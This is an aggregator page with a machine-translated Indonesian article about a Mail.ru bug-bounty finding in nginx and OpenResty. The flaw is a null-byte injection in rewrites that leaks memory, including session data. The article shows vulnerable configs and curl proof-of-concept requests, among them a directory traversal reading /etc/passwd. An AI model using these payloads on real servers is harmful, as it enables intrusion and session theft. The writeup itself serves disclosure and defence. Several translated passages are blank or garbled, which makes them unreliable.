<!doctype html>
<html class="no-js" lang="id">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🚉 🗺️ 👋🏼 Tentang satu kerentanan di ... 👨🏽‍🎓 👂🏻 👨🏿‍🔧</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Setahun yang lalu, 21 Maret 2019, dalam program karunia bug Mail.ru di HackerOne, muncul laporan bug yang sangat bagus dari maxarr . Saat menyematkan ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>Tentang satu kerentanan di ...</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/company/mailru/blog/493920/"><img src="https://habrastorage.org/webt/du/k3/h5/duk3h5leha8sz3qinzb3g_8yfsk.jpeg"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Setahun yang lalu, 21 Maret 2019, dalam </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">program karunia bug Mail.ru</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> di HackerOne, muncul </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">laporan bug yang</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> sangat bagus </font><font style="vertical-align: inherit;">dari </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">maxarr</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Saat menyematkan byte nol (ASCII 0) dalam parameter POST dari salah satu permintaan API webmail yang mengembalikan pengalihan HTTP, potongan memori yang tidak diinisialisasi terlihat dalam data pengalihan, di mana fragmen dari parameter GET dan header permintaan lainnya untuk server yang sama.</font></font><br>
<a name="habracut"></a><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Ini adalah kerentanan kritis karena permintaan termasuk cookie sesi. Beberapa jam kemudian, perbaikan sementara dibuat, yang memfilter byte nol (ternyata kemudian, ini tidak cukup, karena ada kemungkinan menyuntikkan CRLF / ASCII 13, 10, yang memungkinkan Anda untuk memanipulasi header dan data respon HTTP, ini kurang penting, tetapi masih tidak menyenangkan). Pada saat yang sama, masalahnya dirujuk ke analis dan pengembang keamanan untuk menemukan dan menghilangkan penyebab bug.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Mail.ru mail adalah aplikasi yang sangat rumit, sejumlah besar komponen front-end / back-end yang berbeda, keduanya open source (terima kasih banyak kepada semua pengembang perangkat lunak gratis) dan pengembangan kami sendiri, dapat berpartisipasi dalam respons. Dimungkinkan untuk mengecualikan semua komponen kecuali nginx dan openresty dan untuk melokalisasi masalah sebelum memanggil </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ngx.req.set_uri ()</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dalam skrip OpenResty, yang tidak berperilaku seperti yang diharapkan (menempelkan byte nol atau umpan baris melalui parameter GET dari menulis ulang ke ngx_http_rewrite_module, yang, menurut dokumentasi, digunakan dan, tampaknya, harus bekerja dengan cara yang sama). Kemungkinan konsekuensi dihilangkan, pemfilteran paling ketat ditambahkan, dan diverifikasi bahwa pemfilteran menghilangkan semua vektor yang mungkin. Tetapi mekanisme yang menyebabkan kebocoran isi memori tetap menjadi misteri. Sebulan kemudian, laporan bug ditutup sebagai yang diotorisasi, dan analisis penyebab bug ditunda hingga waktu yang lebih baik.</font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
OpenResty adalah plugin yang sangat populer yang memungkinkan Anda untuk menulis skrip Lua di dalam nginx, dan digunakan di beberapa proyek Mail.ru, sehingga masalahnya tidak dianggap terselesaikan. Dan setelah beberapa waktu, mereka tetap kembali padanya untuk memahami penyebab sebenarnya, konsekuensi yang mungkin terjadi, dan membuat rekomendasi untuk pengembang. Kode sumber digali oleh </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Denis Denisov</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> dan </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Nikolai Ermishkin</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . Ternyata:</font></font><br>
<br>
<ul>
<li> nginx   rewrite      directory traversal (  SSRF)   ,    ,         <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Nginx Amplify</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u=">Gixy</a>   (,    , ).   OpenResty    ,      .<br>
<br>
 :<br>
<br>
<pre><code class="nginx hljs"><span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /rewrite</span> {
    <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^.*$</span> <span class="hljs-variable">$arg_x</span>;<font></font>
}<font></font>
<font></font>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">root</span> html;
    <span class="hljs-attribute">index</span> index.html index.htm;<font></font>
}</code></pre><br>
<br>
<br>
<br>
<code>curl localhost:8337/rewrite?x=/../../../../../../../etc/passwd<br>
root:x:0:0:root:/root:/bin/bash<br>
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br>
bin:x:2:2:bin:/bin:/usr/sbin/nologin<br>
...</code><br>
<br>
</li>
<li> nginx  ,     ,   rewrite   .    nginx    ,    ,       ,       ,       ,     .     <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="></a>.<br>
<br>
  (^@  )<br>
<pre><code class="nginx hljs">
<span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /memleak</span> {
    <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^.*$</span> <span class="hljs-string">"^<span class="hljs-variable">@asdfasdfasdfasdfasdfasdfasdfasdfasdfasdfasdasdf</span>"</span>;<font></font>
}<font></font>
<font></font>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">root</span> html;
    <span class="hljs-attribute">index</span> index.html index.htm;<font></font>
}</code></pre><br>
<br>
<br>
<code>curl localhost:8337/secret -vv<br>
...<br>
curl localhost:8337/memleak -vv<br>
...<br>
Location: http://localhost:8337/secret<br>
...<br>
</code><br>
</li>
<li>Nginx  GET-          rewrite  GET-.         nginx  . POST     . OpenResty     GET   POST ,    POST   OpenResty     .<br>
<br>
 :<br>
<br>
<pre><code class="nginx hljs"><span class="hljs-attribute">location</span> <span class="hljs-regexp">~ /memleak</span> {
    <span class="hljs-section">rewrite_by_lua_block</span> {<font></font>
        ngx.req.read_body();<font></font>
        <span class="hljs-attribute">local</span> args, err = ngx.req.get_post_args();<font></font>
        ngx.req.set_uri( args["url"], <span class="hljs-attribute">true</span> );<font></font>
    }<font></font>
}<font></font>
<font></font>
<span class="hljs-attribute">location</span> / {
    <span class="hljs-attribute">root</span> html;
    <span class="hljs-attribute">index</span> index.html index.htm;<font></font>
}<font></font>
</code></pre><br>
<br>
:<br>
<br>
<code>curl localhost:8337 -d "url=secret" -vv<br>
...<br>
curl localhost:8337 -d "url=%00asdfasdfasdfasdfasdfasdfasdfasdf" -vv<br>
...<br>
Location: http://localhost:8337/{...  secret...}<br>
...<br>
</code><br>
</li>
</ul><br>
<h4> </h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Masalahnya dilaporkan ke pengembang nginx dan OpenResty, para pengembang tidak menganggap masalah tersebut sebagai kesalahan keamanan di nginx, karena di nginx sendiri tidak ada cara untuk mengeksploitasi kesalahan melalui injeksi karakter khusus, perbaikan untuk </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">mengungkapkan isi memori</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> diterbitkan pada 16 Desember. Dalam 4 bulan sejak laporan, tidak ada perubahan yang dilakukan untuk OpenResty, meskipun ada pemahaman bahwa versi aman dari fungsi ngx.req.set_uri () diperlukan. Pada 18 Maret 2020, kami menerbitkan informasi, pada 21 Maret, OpenResty merilis </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">versi 1.15.8.3</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , yang menambahkan cek URI. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Portswigger </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">menulis</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Saya mengambil artikel yang bagus dari OpenResty dan Nginx (meskipun komentar bahwa hanya sepotong kecil memori yang diungkapkan tidak benar dan menyesatkan, ini ditentukan oleh panjang baris setelah byte nol dan, tanpa adanya batasan panjang yang jelas, dapat dikontrol oleh penyerang).</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Jadi apa kesalahannya dan apa yang harus dilakukan untuk mencegahnya?</font></font></h4><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apakah ada kesalahan pada nginx?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ya, itu, karena kebocoran memori adalah kesalahan. </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apakah ada kesalahan di OpenResty?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ya, setidaknya masalah keamanan fungsi yang ditawarkan oleh OpenResty belum diselidiki dan didokumentasikan. </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apakah kesalahan konfigurasi / penggunaan OpenResty telah dibuat?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> Ya, karena tanpa adanya indikasi eksplisit, asumsi yang tidak diverifikasi dibuat tentang keamanan fungsionalitas yang digunakan. </font></font><br>
 <br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Manakah dari kesalahan ini yang merupakan kerentanan keamanan hadiah $ 10.000?</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Bagi kami, ini umumnya tidak penting. </font><font style="vertical-align: inherit;">Dalam perangkat lunak apa pun, terutama di persimpangan beberapa komponen, terutama yang disediakan oleh berbagai proyek dan pengembang, tidak ada yang bisa menjamin bahwa semua fitur pekerjaan mereka diketahui dan didokumentasikan dan bahwa tidak ada kesalahan. </font><font style="vertical-align: inherit;">Oleh karena itu, setiap kerentanan keamanan muncul tepat di tempat yang memengaruhi keamanan. </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Bagaimanapun, adalah praktik yang baik untuk menormalkan atau membatasi / memfilter data input, yang masuk ke modul / API eksternal, jika tidak ada indikasi eksplisit dan pemahaman yang jelas bahwa ini tidak diperlukan.</font></font><br>
<br>
<h4><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kesalahan</font></font></h4><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
Menurut pengalaman </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=id&amp;u="><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dari artikel sebelumnya</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> , dalam rangka melestarikan kemurnian bahasa: </font></font><br>
<br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">bug karunia</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - kompetisi berburu untuk bug </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">laporan bug</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - pemberitahuan kesalahan </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">redirect</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - redirect </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">opensorsny</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - open source </font></font><br>
<i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">yang dikenal sebagai ralat</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> - bekerja pada bug</font></font></div>
      
    </div>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../id493898/index.html">"Di mana kaki tumbuh dari" atau apa yang mendahului pemrograman?</a></li>
<li><a href="../id493904/index.html">Bagaimana kehilangan kepercayaan pada AI, atau bagaimana saya diganggu oleh Gradient Photo Editor</a></li>
<li><a href="../id493906/index.html">Pintasan Windows Beracun: artefak lama yang tidak dilupakan oleh peretas, tetapi sebagian dilupakan oleh forensik</a></li>
<li><a href="../id493914/index.html">Web2Text: ekstraksi konten halaman web yang terstruktur dalam</a></li>
<li><a href="../id493918/index.html">Bagaimana pandemi mempengaruhi penyedia VPN</a></li>
<li><a href="../id493922/index.html">Kacamata penglihatan suram. API Android Camera2 dari Maker Part 5 Flash</a></li>
<li><a href="../id493924/index.html">Hentikan konveyor! Anda memberikan proyektor Epson XGA dengan harga SVGA</a></li>
<li><a href="../id493926/index.html">Trik untuk Menguji Aplikasi Web Laravel Menggunakan Pabrik Model</a></li>
<li><a href="../id493928/index.html">Tinjau dan uji Huawei Dorado 5000V6</a></li>
<li><a href="../id493932/index.html">Ikhtisar Survei Google. Mengapa itu tidak cocok untuk penelitian serius</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter63335242 = new Ya.Metrika({
                  id:63335242,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/63335242" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-13', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Geek Week | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2020</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=i62cJ2037o_BACd40gCrIso3niu0Sjx2sDFYJkeYdRk&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>